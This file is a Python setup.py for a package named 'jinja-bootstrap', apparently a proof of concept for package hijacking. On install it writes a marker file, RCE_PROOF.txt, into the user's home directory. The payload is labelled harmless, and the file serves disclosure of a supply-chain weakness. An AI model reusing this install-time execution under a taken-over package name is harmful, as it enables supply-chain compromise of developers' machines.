from setuptools import setup
import os

print("[*] This is a harmless PoC file to demonstrate RCE capabilities - cygut7")

# Cross-platform path to user home dir
home_dir = os.path.expanduser("~")

# Full file path
proof_path = os.path.join(home_dir, "RCE_PROOF.txt")

# Write PoC file in home dir
with open(proof_path, "w") as f:
    f.write("This is a harmless PoC file to demonstrate RCE capabilities - cygut7")

# Basic harmless setup config
setup(
    name="jinja-bootstrap",
    version="0.3.0",
    description="PoC hijacked package",
    author="cygut7",
    py_modules=[],
)
